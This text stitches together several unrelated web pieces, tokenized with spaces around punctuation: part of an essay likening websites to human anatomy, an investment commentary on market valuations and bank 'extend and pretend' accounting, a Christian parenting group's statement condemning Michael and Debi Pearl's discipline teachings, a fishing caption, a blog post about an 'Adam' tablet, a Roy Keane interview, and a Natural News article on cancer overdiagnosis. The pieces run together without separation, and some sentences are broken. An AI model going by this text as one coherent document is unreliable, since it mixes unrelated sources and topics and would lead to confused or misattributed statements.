Well , part of it is their features such as their eyes , nose and mouth , but their skin and visual appearance play an important role .
Whether someone is tall , short , fat or thin , the skin adopts the form , and is fairly elastic and flexible in how it covers all of the structures of the body .
While you ’ll want your site ’s skin to appear beautiful ( as design is as relevant as human beauty ) you also want to make sure that nothing “ hangs out ” , looks ugly , or out of place !
Things always look prettier with skin attached ; your website is no different !
In terms of web design , the primary language dealing with the style of a website is CSS .
This attaches itself to your structure and layers on elements of style , which give the visible physical appearance you desire .
If you want your site ’s skin to be neon green and flashing pink , though not advised , it is entirely possible !
Just like in humans , the skin is simply the outer layer that works with the internal elements but has its own unique method of affecting how the body will look to the visitor .
Bonus :
Unlike humans , a website design can alter its own physical appearance dynamically .
Techniques include using behaviour like JavaScript to alter style on demand .
This gives sites a chameleon - like quality because they can adapt to their conditions or surroundings .
When the skin is wrapped around something , it feels like an entirely different creature .
Brain Retain : Server- side Scripting and DBMS
The thing in your head allowing you to think , remember , and behave according to your surroundings , is the closest thing to a computer you have .
The brain allows decisions — the best method of dealing with complex situations — to be made .
How does this apply to a site ?
There are three things that must be taken into account which apply directly between human and website anatomy .
These are referred to as the acts of behaviour , memory and identity .
The brain handles a lot of stuff , even your website ’s server has to take in everything it ’s told !
When we talk about the behaviour of the brain , I am referring to the things we think about doing and then override our bodies to achieve , such as when you instruct your body to punch someone ( thereby carrying out the punching action ) .
While we have already mentioned behaviour in terms of muscles , you should remember that you do not think ( actively ) about breathing or walking — you go through a methodology of stimulus and response ( and the brain controls reactions which occur ) .
Bonus : Server - side scripting for dynamic websites showcase a site ’s brain at work , allowing your website to make decisions based on a situation ( or previous knowledge as held in storage ) and act upon them rather than automatically carrying out an action ( like muscles ) .
The brain has the ability to remember many thousands of things , and computers can do the same .
When you store information within a database , it holds the information until it is requested , deleted or damaged ( this acts the same as a human ’s long - term memory ) .
This information is usually organized relative to what type of information is contained , and can be easily searched or referenced to access the information without suffering digital amnesia .
Servers have to relay the content you input to a place where it can be recalled , it ’s just like human memory .
Of course , everyone also has short - term memory : Both cookies ( which retain stimulus specific data like usernames and passwords ) and browser caching ( which contain re-usable more generic visual stimulus — like images and client - side scripts ) hold the purpose of storing small pieces of information for a limited period of time .
With both long and short - term memory that can be retrieved and used until deleted or committed to a permanent and secure form of memory , it ’s easy to see the human resemblance .
Bonus :
Of course , the human brain is much more powerful than that of current computer systems , but the diversity of information management , memory and organization gives computers a strong relationship in the likeness the human anatomy has to websites .
Last is the act of identity : being able to know who , what and why you are .
We all have our own personalities and this is something we take for granted , but sites can have their own unique sense of self in the form of metadata .
This information is held in the head ( or as I call it , “ thinking ” code ) of each page which is not visible to visitors but explains to search engines , browsers or applications wanting to associate with the contents contextual or semantic value , just like in a reference library .
Your head does the thinking and your body visibly reacts , just like your website .
Bonus :
While a site ’s identity may be produced by its title and meta information , the actual information and abilities which a website contains are ultimately what determine the real nature of a website ( sort of like humans having personalities reflected in their appearance ) .
Nature versus Nurture
While all of the above may help you explain the process of web design to clients in a way they can understand ( or perhaps just give you something fun to pass around the office ) , it ’s important to know that lessons can — and should — be taken from the relative interlinking that a site can have with how the human body is formed .
A site , just like humans , can suffer imperfections .
Some can be overcome , some ca n’t ( without a total redesign ) , and therefore care and attention should be given to helping overcome problems of significance .
The evolution of a website can equally be put down to a mixture of nature ( what the coder puts into the site ) and nurture ( what the end - user adds with growth ) , both of which have significant importance and should n’t be ignored .
A website ’s survival depends on many things working perfectly in synchronization .
I think most of us underestimate how complex rendering a website is .
Frequent testing can spot early onsets of problems .
But the most important thing to consider is that websites ( just like humans ) are formed of many layers , all interacting together , to which you need to apply as required ( without making the site obese ) .
Think of your website like a child , you do n’t just feed it once and abandon it .
The child requires time , money , effort , care and attention to keep it healthy and help it survive into adulthood .
Websites are like humans , they have layers , all interacting and working in synchronicity .
I think it ’s a fair comment to make that while standards and the way we build websites evolve , the need to make our work less static and more interactive and dynamic will aid our continued progression towards the next level of the Web .
Who knows , in a few years we could yet again find ourselves becoming even more involved and emotionally tied into our brands than we are today !

Extend and Pretend

Over the past 12 years or so , I 've been repeatedly astonished at the tendency of investors to do things that they should have known to avoid simply with the use of a calculator and basic arithmetic .
We 've used numerous metrics during this period to show that the estimation of long - term market returns ( 7 - 10 years and beyond ) does n't require calculus or statistics , but fairly direct methods to normalize earnings , plus a bit of arithmetic .
Rich valuations are predictably followed by sub-par returns .
As a result , investors have earned an average annual total return of just 2.4 % in the S&P 500 over the past 12 years , while enduring two separate instances where they have lost about half of their money as part of the ride .
Essentially , we have gone nowhere in an interesting way .
At present , investors have priced the market at a level that makes a continuation of this experience likely for several years to come .
I noted last week that at current valuations , the S&P 500 is priced to deliver a total return of only about 5.7 % annually over the coming decade .
Though it generally takes about 7 - 10 years to reliably revert from valuation extremes , a good portion of that reversion often occurs within 5 years ( outside of the twin bubbles to the 2000 and 2007 highs ) .
Presently , a normalization of valuations , not to extreme undervaluation but simply a reversion to post - war , non -bubble norms , would imply an average annual return for the S&P 500 of just 2.97 % over the coming 5 year period .
This outcome is not dependent on whether or not we observe a second set of credit strains , but is instead baked into the cake as a predictable result of prevailing valuations .
The risk of further credit strains simply adds an additional layer of concern here .
Investors have chased risky securities over the past year to the point where the risk premium for default risk has eroded to the levels we saw at the peak of the credit bubble in 2007 .
My sense is that this is a mistake that will be painfully corrected .
Investors now rely on a sustained economic recovery and the absence of any additional credit strains - and even then would be likely to achieve only tepid long - term returns from these levels .
We certainly would have achieved better returns over the past year had I ignored the risk of further credit risks as investors , in hindsight , have done .
But at this point , market conditions are unfavorable even on the basis of post - war data , and even on the assumption that the economy will improve further .
Stocks historically have been vulnerable to abrupt losses at the point where the market environment reflects overvalued , overbought , overbullish , rising yield conditions .
It 's true that the market has a tendency to continue achieving marginal new highs for a number of weeks after those conditions are established , but significant damage often follows abruptly and unpredictably .
If you look at the performance of the stock market on a long - term historical basis , you 'll observe that there are alternating periods of " secular " bull and bear trends , which are essentially driven by long transitions between unusually high valuation multiples and unusually low valuation multiples .
" Secular " bear markets ( which have generally lasted 17 - 18 years in U.S. data ) are periods where the market begins from a very rich level of valuations , and then experiences several individual bull - bear cycles , but where each successive bear market typically achieves a lower level of valuation ( though not necessarily a lower absolute price trough , if earnings and other fundamentals grow ) .
Overall , the market provides little durable return over the full period .
The last secular bear market period ran from the valuation peak of the mid-1960's to the valuation trough of 1982 - essentially a 17 year period .
The last secular bull market ran from 1982 to 2000 .
I suspect that the secular bear market that began at the valuation peak of 2000 is incomplete .
As of last week , the S&P 500 remained strenuously overvalued on the basis of normalized fundamentals .
From that perspective , even if the trough we observed in March 2009 was the ultimate price low of the secular bear market since 2000 , it 's not likely to represent the ultimate valuation trough .
Given the current state of valuations , and the likelihood of several years of additional credit deleveraging , it seems that economic conditions , valuations , and the typical duration of secular bear markets converge on the likelihood of several more years of interesting but unrewarding market volatility .
Secular bull market periods tend to begin with quite low multiples to normalized earnings ( historically , on the order of 7 ) , which is what provides the platform for a very long period of subsequent gains .
It would not be surprising to observe a sequence of cyclical movements comprising a bear - bull - bear series , ending with a final and uncomfortable valuation trough ( perhaps 6 - 8 years from now ) before the market is finally priced to deliver that sort of sustained " secular " period of long - term gains .
Current valuations provide no such platform .
Again , at this point it does not matter whether we anticipate further credit strains or not .
Wholly on the basis of current valuations , stocks are priced to deliver unsatisfactory returns in the coming years - a situation that is worsened by strenuous overbought conditions and upward yield pressures here .
Extend and Pretend
With regard to credit conditions , the U.S. financial system continues to pursue a strategy of " extend and pretend . "
A year ago , the Financial Accounting Standards Board ( FASB ) suspended rule 157 , which had previously required banks to mark their assets to market value when preparing balance sheet reports .
The basic argument was that fair values were not appropriate because there was " no market " for troubled assets .
Certainly , the FASB could have implemented something at least modestly reasonable , such as 2 - year or 3 - year averaging , but instead , they changed the rules to allow " significant judgment " in the valuation of bank assets in their financial reports .
To a large degree , the idea that there was " no market " for troubled assets was false even at the time .
Last year , Dean Baker of the well - regarded Center for Economic Policy Research ( CEPR ) testified before Congress , observing " There has been considerable confusion about the nature of the troubled assets held by the banks .
While banks do hold some amount of mortgage - backed securities , these securities are in fact a relatively small portion of their troubled assets .
The troubled assets on the banks ' books are overwhelmingly mortgages , both first and second or other junior liens , not mortgage - backed securities .
The FDIC has acquired large quantities of mortgages from its takeover of several dozen failed banks over the last year .
It auctions these assets off on an ongoing basis .
The results of these auctions are available on the FDIC website .
Non-performing mortgages typically sell in these auctions at prices in the vicinity of 30 cents on the dollar . "
He continued , " It is not clear on what basis these auctions can be said not to constitute a market .
While the downturn and the constricted credit conditions affect the market , it is simply inaccurate to claim that there is no market for these assets .
The major banks are undoubtedly not pleased at the prospect of having to sell off their loans at these prices , but this merely indicates that they are unhappy with the market outcome , just as a homeowner might be unwilling to sell her house at a loss .
However , the unhappiness of the seller does not mean that there is no market . "
The impact of " extend and pretend " is to create a gap between the reported value of assets and the value they would have on the basis of the cash flows that those assets can reasonably be expected to generate over their maturity .
In order to avoid having to restate assets , banks have allowed an increasing gap to develop between the volume of delinquent loans and the volume of loans actually in foreclosure , creating a growing " shadow inventory " of impaired but unmodified and unforeclosed loans .
Moreover , regulatory changes over the past year have affected what actually gets reported as " troubled . "
As the New York Times recently observed , " A bank owed , say , $ 4 million on a property now worth $ 3 million would previously have had to classify the entire loan as troubled .
Now it can do that to the $ 1 million difference only . "
In effect , even though impaired loans tend to sell at only 30 - 50 cents on the dollar ( reflecting a modest haircut to the amount typically received in foreclosure ) , banks can choose the amount of assets it reports as troubled simply by choosing what value to assign the property while it holds the bad loan on its books .
While it 's interesting that credit card delinquencies have eased off modestly in recent months , this is not necessarily a healthy sign .
Even in the third quarter of 2009 , TransUnion reported that consumers delinquent on their mortgages but current on their credit cards increased by 6.6 % .
In effect , people have been choosing to pay their credit cards in priority to their mortgages .
As for policy efforts to reduce delinquencies , I 've long argued that it is a bad idea for policy makers to announce delinquency prevention plans that have , as their centerpiece , publicly subsidized reductions in mortgage principal .
It 's one thing to extend the loan in a way that preserves its present value , by swapping a claim on future appreciation in return for principal reduction , but it 's quite another to offer to cut the principal outright .
The reason is that instead of confining the assistance to presently troubled borrowers , you create a whole new set of borrowers who then choose to be troubled in order to get the assistance .
According to a University of Chicago study , " strategic defaults " - where people choose to default on their mortgages even though they can afford to pay - accounted for 35 % of all residential defaults in December 2009 , up from 23 % in March 2009 .
Offering public subsidies for this behavior , when too many homeowners are already legitimately struggling , does not smack of a bright idea .
The New York Times recently provided a good picture of how the delinquency situation stood at the end of 2009 ( based on FDIC data ) :
The real concern from my perspective remains the potential for a second wave of delinquencies beginning in data as of the first quarter of 2010 and extending well into 2011 .
While we 've seen some suggestions that many Alt - A and Option - ARM loans have already been modified , the premise of this argument is problematic since it is also true that about three - quarters of modified mortgages go on to default a second time , and few of these modifications result in substantial alterations in principal or interest payments beyond 12 months .
In short , my impression is that investors are deluding themselves about the solvency of the banking system .
People learned in the 1930's that when you do n't require the reported value of assets to have a clear and tangible link to the value that the assets would have in liquidation , bad things happen .
Yet this is what regulatory and accounting rules are allowing for the banking system at present .
While I do believe that bank depositors are safe to the extent of FDIC guarantees , my impression is that the banking system is still quietly insolvent .
Will it work ?
Will it change ?
Regardless of whether the U.S. banking system would not presently be able to meet its liabilities with its assets , there is another question : assuming that banks are allowed to extend and pretend for a long enough period of time , will they ultimately be able to accumulate enough retained earnings in the years ahead to cover eventual loan losses ?
In other words , is it possible that everything will be OK if we just look the other way long enough ?
From my perspective , it depends on what " OK " means .
Simply in terms of long - term solvency - assets being ultimately able to meet liabilities - my impression is that yes , given enough time , retained bank earnings should cover the losses on existing loans .
Indeed , it 's possible that banks might be able to report fairly healthy " operating earnings " to investors , and then somewhat more quietly write off losses as " extraordinary " charges over a period of years .
This type of outcome is beginning to look possible , because investors evidently do n't mind repeatedly having their pockets picked as long as " operating earnings " come in above analyst estimates .
Unfortunately , in that sort of world , the economy would likely be hobbled for a long period of time , as Japan has discovered over the past couple of decades .
With banks focused primarily on survival and recapitalization , retained earnings would be directed to making the existing liabilities whole , rather than contributing to productive new investment .
In January , the London Economist reported a study by the McKinsey Global Institute , noting " Assigning the odds of further deleveraging is not the same as gauging its likely economic impact .
To do that , the study looks to history .
It finds 32 examples of sustained deleveraging ( at least three consecutive years in which ratios of total debt to GDP fell by at least 10 % ) in the aftermath of a financial crisis .
In some cases the debt burden was reduced by default .
In others it was inflated away .
But in about half the cases — which the report regards as the most appropriate points of comparison — the deleveraging came through a prolonged period of belt - tightening , where credit grew more slowly than output .
The message from these episodes is sobering .
Typically deleveraging began about two years after the beginning of the financial crisis and lasted for six to seven years .
In almost every case output shrank for the first two or three years of the process .
( Countries which defaulted or inflated their debt away saw bigger recessions at first , but had higher output growth than the belt - tighteners by the end . ) "
So to the extent that " extend and pretend " is successful in averting insolvency concerns , it will also tend to weigh down lending activity , as resources are allocated toward servicing existing debt burdens on bad assets , rather than toward new lending for productive activity .
The most efficient outcome is always for lenders who provide capital to take losses if the loans go bad .
That sort of market discipline is the only way to ensure that capital gets allocated properly .
This is not the world that we have lived in over the past year , as policy makers have pledged public money to make private bank bondholders whole , regardless of how irresponsibly the banks allocated the money .
But it is important to recognize that this policy comes with longer term costs .
It is not clear how long accounting standards will continue to enable this obscured portrait of the banking system .
Last week , the International Accounting Standards Board and the U.S. Financial Accounting Standards Board said that they expect to issue a proposal in the next few weeks that might change the way that banks are required to report assets .
But even if they do , formal consideration would not take place until perhaps the third quarter of 2010 .
Sir David
Tweedy , who heads the IASB , said " Politicians have been saying a major objective of financial reporting is stability -- we think it 's transparency . "
Thus far , this is still only talk .
But it 's something worth watching , and it is crucially important .
Accounting standards that obscure the true value of assets and liabilities cannot be consistent with a properly functioning financial system .
Uncomfortable as it might be , the only way to escape darkness is to shed light .
Market Climate
As of last week , the Market Climate for stocks remained characterized by strenuous overvaluation , strenuous overbought conditions , overbullish sentiment , and hostile yield pressures .
True to its short - term form in these conditions , the market pushed to yet another marginal new high last week .
The tendency for the market to shrug off widely observed overbought conditions may make it seem that these conditions do n't matter .
But I can't stress enough that the pattern of short - term continuation to marginal new highs is quite typical once the market establishes this syndrome of conditions , following which abrupt , nearly vertical losses are also typical - if unpredictable in timing .
The Strategic Growth Fund remains fully hedged , with a " staggered strike " position that raises the strike prices of our defensive puts to tighten that defense ( given the very low level of implied volatility , which sunk below 17 % last week ) .
Compared with a standard fully hedged investment stance , the amount invested in additional put option premium to raise those strikes represents just over 1 % of assets at present .
In bonds , the Market Climate last week continued to be characterized by relatively neutral yield levels and unfavorable yield pressures .
The 10 - year yield bounced off of the 4 % level last week .
While a move moderately above 4 % might prompt us to extend our durations in the Strategic Total Return Fund , we are presently comfortable with a duration of slightly less than 4 years .

A GCM Statement : It 's Time to Speak Out Against the Teachings of Michael & Debi Pearl A GCM Statement :
It is Time to Speak Out Against the Teachings of Michael and Debi Pearl
This statement may be re-posted in its entirety .
The admins of Gentle Christian Mothers ( GCM ) have felt led at this time , as we mourn the loss of seven year old Lydia Shatz [ 1 ] , to issue a statement of disagreement with Michael and Debi Pearl and their child rearing methods .
Not only are their methods extreme and outside the realm of normal and healthy child rearing practices , but the doctrinal foundation for these methods contain a level of heresy , including denial of the Christian doctrine of original sin [ 2 ] [ 3 ] , which leave them without biblical basis and at odds with the truth that all are in need of salvation which has been provided through Jesus alone [ 4 ] .
Though the Pearls affirm the value of relationships in parenting in their attractive " tying heartstrings " message , their harsh teachings are in diametric contrast to building healthy relationships .
They advocate " training " and " chastisement " of children , starting in infancy [ 5 ] [ 6 ] , using methods and means not described in Scripture -- including using ¼ inch plumber ’s supply line as a spanking instrument [ 7 ] and claiming that a " proper spanking leaves children without breath to complain " [ 8 ] -- for stated purposes of absolving guilt and cleansing the child 's soul [ 9 ] .
The combination of an adversarial us vs. them mindset where the parents must " win , " physically " disciplining " children until they surrender their will and show total submission , and false doctrine makes the Pearls ' methods dangerous .
They present a very distorted picture to the world of what it means to be a follower of Jesus and a Christian parent in the world today .
It is time for Michael and Debi Pearl to be held accountable for their teachings .
We urge other Christians to join us in speaking out against what Michael and Debi Pearl have been teaching for far too long .

Reason : to correct a misspelling
Wait until the end !
Sometimes its just not worth getting your hook back ... ouch .
This was taken on a fishing trip out in the Gulf of Mexico about 45 - 50 miles West of Marco Island , FLHe was all macho until ...
Extremely sorry to all those who were waiting patiently .
Things really got busy here .
Lot ’s of good stories to share , but heck NDAs !
Lot ’s of ‘ extremely exhaustive ’ content coming your way !
We want to make Adam a universal device which can give you access to a lot of different kind of content , and that is exactly where we are working right now .
Have done few collaborations on the content front which will be beneficial for all .
Being a student myself , I am personally working to make the lives of all students pretty easy when it comes to getting educational content on the device and that too , at a competitive price .
i Pad will be launched today !
Waiting eagerly for one like you all .
Have ordered for one to understand did we miss anything ?
Or is there something we should learn or improve upon ?
They are genius when it comes to streamlined interactions .
“ One store to rule them all ! ” .
But then a different app for books ?
May be more for comics , newspapers , magazines ?
Let ’s see .
We are doing some innovation on email front as well .
Business people will love it .
It will give you an amazing freedom which we never had .
Wish I could share more on the names of the companies we are working with .
There will be announcements soon .
We will soon be announcing the Application Competition Soon .
Developers of already exiting application will have a lot to earn as well .
We are also into lots of University Collaboration as well .
Developing technologies with them , for them , for the open communities , and we are open to lot more to work closely with .
“ They will be the first ones to get early access to the devices as well . ”
So , are the stories of product delays true ?
To be frank , I ca n’t say about other companies .
But we want to go ahead only with Flash availability .
As soon as the stable Flash is there , there will be two months of testing and we will hit the stores .
Also to remember here is the marketing strategies of our partners aka Telecom Firms .
It depends a lot on them when they want to hit the markets .
We have seen different strategies for different players .
Some want to give you Adam for Thanksgiving , some for summer holidays , some when you start a new year at your schools .
So , it depends .
Again , apologies for those who were waiting for some information on the blog .
It is due to “ your ” support that a 24 something like me can do something this big .
Warm Regards and Love !
ROY KEANE INTERVIEW :TOM
HUMPHRIES meets a more stress - free Roy Keane at his annual state of the nation address
HE GOT into Dublin on Wednesday night .
Watched Barca and Inter on a bar room screen .
Mourinho !
Then he had an early night .
Sipping the last cup of tea from a long day , he thought passingly of nights spent in Dublin when he was younger .
Skid marks all over the city .
Smoke plumes in the morning .
And he thought of Mourinho cavorting on some foreign field .
Number one .
All part of a journey .
The country behind .
The country that any young manager hopes is ahead .
On Thursday he performed his annual gig for the guide dog people .
He enjoys it , he says , with a pointed lack of piety .
And it is enjoyable .
The fascination with him never really wanes .
Every year word spreads quietly through the ranks of all concerned with the day as to what sort of form HE is in .
Not that he has ever gone all Hannibal Lecter and consumed a guide dog puppy between two slices of bread .
No , more that these visits – the media segment of which is jokingly known as Roy Keane ’s state of the nation address – are a good chance to read where Roy Keane ’s head is at .
And love him or loathe him , that ’s always interesting .
By Thursday evening he was gone again , leaving behind a trail of quotes and thoughts like breadcrumbs in a fairytale .
So what sort of form is he in ?
It was unanimous he looked more stress - free and content than ever before , the worries of the world lifted from his shoulders , at least temporarily .
He is too driven a man to keep his bonnet entirely free of bees for a sustained period but for now he is content .
Which is n’t bad for a man who spent the first third of the season on death row with the media counting down the days to when Ipswich ’s reclusive owner Marcus Evans would strap Roy Keane into an electric chair .
They started with a loss and a draw and that stretched itself into a run of 14 games without a win , his Friday press conferences becoming an exercise in defiance as they came with picks and shovels to bury him .
Finally , on Halloween , something broke .
“ I ’ll be the better manager for it , ” he says with a grin .
“ Against Derby a back popped up in the box with a header .
Derby took a chance that day , they played well against us , and we just got the break .
“ This year ’s experience will stand me in good stead .
More so than at Sunderland .
I ’ve learned .
I go back to the first day of season .
Coventry .
Any team that goes up from the Championship , and it ’s 30 in 10 years , you need four points out of your first two games .
Burnley did it when they went up and we did it at Sunderland when I was there but generally speaking that ’s the rule .
We had a draw from the first two games . ”
A season of 20 draws , giving away leads .
Where do the points go , where are the cracks in the floor .
Sheffield United ?
Handed them two points wrapped in a 92nd - minute goal .
Watford ?
94th minute .
There you go .
WBA , 93 minutes ?
You ’re welcome .
Doncaster , 83 minutes ?
Hello ?
Are you going to say thank you ?
Level with Barnsley until the sixth minute of injury - time .
Who loses in the 96th minute ?
He gave 19 debuts .
Used five first - team goalkeepers , including a guy who lived up the road and came in to keep in shape .
His top goalscorer would n’t reach double figures .
“ People ask about Ipswich this year and the only word that comes to mind is frustration .
Poor start we had this year .
Twenty draws is ridiculous .
Not good draws .
You go through the stats .
We had more possession , more shots etc , I wo n’t bore you .
The amount of injury - time draws killed us . ”
You wait for the who to bless and who to blame stuff .
It ’s not in him today , though .
“ I enjoyed it , though .
We are sprinting harder , we are covering more miles .
We are lacking some experience and a little quality but the players have been brilliant .
Brilliant .
The owner was very good .
Fans were decent .
They are decent people .
They give you the benefit of the doubt .
“ At the start , through all that frustration , I was quite calm .
I had to be because I knew the players were giving me everything .
And I learned a lot from that .
What exactly did I learn ?
I ’m not sure yet because you do n’t know for a while .
At the start of the season I did have a go at a few players but it was n’t bollockings they needed , it was a case of keep it going .
It will happen . ”
He and his wife Therese and the kids lived in a rented house at a seaside resort for the year .
They are moving into a place of their own in three weeks , another compression of the time available in close season .
“ People call it sleepy Suffolk , but it is very quiet and relaxed .
When we are n’t winning and you are out and about , people would never be in your face about it .
We have a great quality of life .
If people come up to us where we live they will say ‘ Stick at it , Roy ’ , or something like that , in a nice way .
No aggression .
“ Sometimes perhaps a club needs that edge but people are generally nice and decent in Ipswich .
They are loyal .
I think it goes back to previous managers , Bobby Robson or Alf Ramsey .
I know the game has changed and that ’s 20 or 30 years ago but they are more understanding .
There is nothing wrong with that niceness within the club .
In terms of stats we dominated lots of teams so maybe there is a soft touch somewhere that we have n’t more points . ”
Last weekend he was in Newcastle and as he came out of the stadium where promotion was still being relished and celebrated he was spat out and had oaths and bits of rubbish hurled at him .
On Wednesday he watched Mourinho enjoy his moment in front of his fans and saw the disappointing sourness of the Barcelona response .
That ’s how the game has gone .
Ipswich , for now , is a bastion .
“ I ’m not under the illusion that I ca n’t lose my job .
The danger is the situation I got into at [ Manchester ]
United and at Sunderland where this momentum starts and there is nothing you can do to stop it and it ends up badly .
“ I ’m not saying the owner would n’t sack me in two minutes , I do n’t take things for granted like that , I ’m just saying that I do n’t think he gets bogged down in things like that , I do n’t think he even reads what is being said , he makes his own judgments .
He is switched on like that .
Makes his own judgments .
And that ’s the way the club is . ”
Sleepy Suffolk .
When he went there first we wondered which would have the bigger impact on the other .
Ipswich on Roy Keane or Roy Keane on Ipswich .
Befitting the theme of his first season , the result is probably a draw .
A team which works hard and honest to make the most of what it has .
A manager appreciating the environment in which he works and lives .
He seems settled now .
Into management and into his life post - playing .
“ It ’s the worst feeling ever when you stop .
Young lads who get bad injuries and have to stop early , I do n’t know how they cope , how do they deal with it ?
I was lucky I got to play for so many years and it was still hard to stop .
For some lads nothing will ever replace the buzz . ”
Of those men who will spend their lives fixing a hole by pouring drink into it , Paul McGrath is one of the most beloved and tragic .
Keane has always been a good friend to his old team - mate and as such he does n’t sugar - coat the message when asked .
“ I was talking to Paul a couple of months ago .
Everybody loves Paul , but Paul knows the score .
He knows where to go and get help .
He says it himself .
He has to help himself .
It has to be down to Paul .
I ca n’t do it for him .
How many people in Ireland have tried to help Paul ?
He knows by now where to get help .
“ When I was having my own escapades I hope I was being young and raw and stupid .
I went too far sometimes , but my social life in that way had a short life - span .
Burned out .
The penny dropped a few years ago for a number of reasons .
Thank God .
I care about Paul .
I care about the man .
When the playing stops the buzz goes , but for some lads that need is there even when playing .
I can just say to Paul that he can stop if he goes to the right people .
“ When you stop playing there is a bit of boredom .
People throw drink at you .
Not helping .
Paul knows where to go .
He has to want it .
Living in Ireland , the drink is going to be there all the time .
When I come back I get a bit of a buzz for two or three days .
I think it ’s embedded in us .
This thing , let ’s get out , there ’s something on here and there .
Drink .
It ’s in the air . ”
They had an end - of - season do the other night in Ipswich .
Paul Merson was the guest speaker .
He ’s been down that road pretty far .
Made Keane think .
“ Especially when you stop playing and you are getting up for the day and there is no buzz , you need it .
It ’s a problem .
It ’s there , especially in the Irish players , I notice .
In my short time in management I notice that just about every incident we have had to deal with that is drink - related , it is Irish lads .
It ’s an issue with Irish players .
Always . ”
Earlier this year when Thierry Henry committed his handball against humanity and our entire race swooned in shock , Keane was accused of living in the past because he compared the FAI ’s handling of the incident with the historic incompetence which marked the Saipan business .
Now , though , he seems content with living in the present tense .
His view on the Henry incident when it comes up in conversation is no more acerbic than to ask what we have learned ourselves from it .
“ It ’s like me and Mourinho .
What separates me from him now .
Every manager looks at him and says there are things to learn .
He wins trophies .
He wins big matches .
He wins close matches .
He wins competitions .
Do we have to get a little bit more cynical ?
If one of our lads did what Henry did and Ireland went through to the World Cup and everybody was packing their bags in the next few weeks .
Would there be many turning down the trip on principle ?
I do n’t think there would .
“ There is an innocence to us .
Look at all these winning positions we lose .
Even at Sunderland myself , I look back and we have the lead in games and we are still playing with two up front .
Pride !
The biggest managers in the world are saying I just want to play one up front .
Chelsea have some of the best strikers in the world there .
They play one up front .
United played Man City last week .
Berbatov cost £ 30 million and is on the bench .
“ There are times .
Ireland v Israel at home a few years ago .
We have the lead .
Looking back it ’s time for us to shut up shop .
Maybe you fake injury .
Slow it .
Does it have to come from the manager ?
Slow it down .
Break their rhythm , you do n’t have to keep going for it .
“ I look at Mourinho and I try to pick things up , do n’t worry .
Lots of guys .
I like [ Rafael ] Benitez .
I learn a bit of that and a bit of this .
This season coming up is an important season for me .
They are all important but this one is big . ”
He has an idea that the Championship is like a jungle swamp .
It can suck good managers in and keep them there so that they never escape .
Gordon Strachan and David Jones , he cites as decent Premier League managers who are in the mire right now , part of the scenery .
And other guys have a window where their stock keeps rising and they make the jump to freedom .
Roberto Martinez had a good spell with Swansea and FA Cup success against Portsmouth and , hey , he was up and away to Wigan in the Premiership .
Either that happens or you take your team up and keep them up .
He reckons Ipswich will need to be competing in the top six to eight sides next season if he is to continue receiving the benefit of the doubt from the town and the club ’s owner .
Clarity is a helpful thing .
“ So , I ’m relaxed .
I am in a better position to know where we need to go at Ipswich than I was this time last year .
I suppose people would say , ‘ I hope so ! ’
Maybe I read a bit much last year into winning those last two games of the season when I came in .
Two players were outstanding in those games .
Giovanni was brilliant but he went back to Spurs and David Norris , got injured in first game .
We lost him for four months .
Then other players did n’t settle in quickly and we had to chop and change .
But I have learned . ”
This end - of - season time , from the outside you would think it had the air of the last days in school before the liberation of the summer holidays .
The sun shining through high windows and wasps trespassing on the peace , everybody waiting for the bell to ring and liberation .
This is the busiest time of the year , though .
“ Staff meetings .
Sort out pre-seasons .
I ’ll try to get an assistant manager .
No relaxing really .
Time is short .
The players are back to work at the end of June .
A manager ’s holidays clash with the kids ’ school year .
So we have to take them out for a week or so and find some place or some way of relaxing and recharging without thinking about football . ”
He is thinking of taking on an assistant manager and has put out a feeler to a specific person already .
“ I could ring the League Managers ’ Association and get a list of hundreds of guys .
I have somebody in mind , though .
I ’ve rung .
Left a message .
We ’ll talk .
Have to meet him for a cup of tea first .
The chemistry is important .
You want somebody you can be close too , somebody with experience .
Not to be looking over your shoulder and wondering is he waiting to step into your job when you are shown the door ! ”
He added a couple of new voices to his staff this year and enjoyed the freshness that they brought to the set - up .
A more experienced assistant manager might provide some of that experience Ipswich need .
Keane himself has changed his routine a little since his Sunderland days .
“ Yeah , I ’m more on the training pitch .
Not doing much more , but watching a lot more .
I know I can overdo it when I am there .
I am intense .
It ’s getting the balance .
When to be in and when not to be in .
I live near the training ground .
I feel I should go in but sometimes it ’s best not to .
When we lost 7 - 1 to Everton at Sunderland .
And we won the next week against Bolton . ”
He spoke to Sam Allardyce after a game once and “ He said to me the worst day of each week is the match day ! ” .
“ I identified with that .
John Robertson , after we played Villa , said to me this is the best Monday to Friday job in the world .
That ’s what it is ! ”
Five days a week in the best job in the world .
Better than he hoped for back when the buzz died .
KEANE SPEAK
On Paul McGrath
“ Everybody loves Paul . . . .
He knows where to go and get help .
He says it himself .
He has to help himself .
It has to be down to Paul .
I ca n’t do it for him .
He knows by now where to get help ”
On Jose Mourinho
“ I look at Mourinho and I try to pick things up .
Every manager looks at him and says there are things to learn .
He wins trophies .
He wins big matches .
He wins close matches .
He wins competitions . ”
( Natural News ) Imagine being told your imaging tests are back and there 's bad news .
You have cancer .
To save your life , your doctor says , you must submit to surgery , chemo , radiation and a host of additional tests and prescription drugs .
Of course , there 's no guarantee the malignancy will be totally stopped or that the cancer treatment wo n't cause both immediate and long - term health consequences .
Now imagine the same scenario -- only it turns out the tests were misinterpreted and you really did n't have any sort of life - threatening cancer in the first place .
This goof - up must be extremely rare , right ?
After all , in the high tech world of modern day mainstream medicine , dangerous malignant tumors are accurately spotted , correct ?
Wrong .
In fact , research just published in thesuggests the overdiagnosis of cancer is nothing less than a large and growing problem in the US .
Study authors H. Gilbert Welch , M.D. , and William Black , M.D. , of the Department of Veterans Affairs Medical Center in White River Junction , Vermont , and the Dartmouth - Hitchcock Medical Center , conclude it 's time for this phenomenon to be faced head - on with the development of clinical and research strategies to quantify , recognize , and deal with cancer overdiagnosis .
So just how big a problem are we talking about ?
Dr. Welch and Dr. Black used data from large randomized screening trials to estimate the extent of overdiagnosis and their findings are nothing less that shocking .
And when it comes to lung cancer screening with chest x-rays and sputum tests , they estimate about half of the " cancers " detected are really cases of overdiagnosis .
What 's more , CT colonography ( virtual colonoscopy ) often detects abnormalities outside the colon that can lead to more tests and a possible overdiagnosis of colon cancer , too .
The researchers pointed out several ways to address the problem of overdiagnosis .
For starters , they suggested educating patients about the risks and benefits involved with early detection .
Another strategy : raising the threshold at which screening test results are labeled ' abnormal ' and treatment is needed .
This is already happening in some cases .
For example , so many small lung nodules are detected on CT scans that it is now becoming more common for physicians to ignore many of these small abnormalities as just that -- small abnormalities -- instead of rushing into this - looks - like - cancer - let 's - treat - it - aggressively mode .
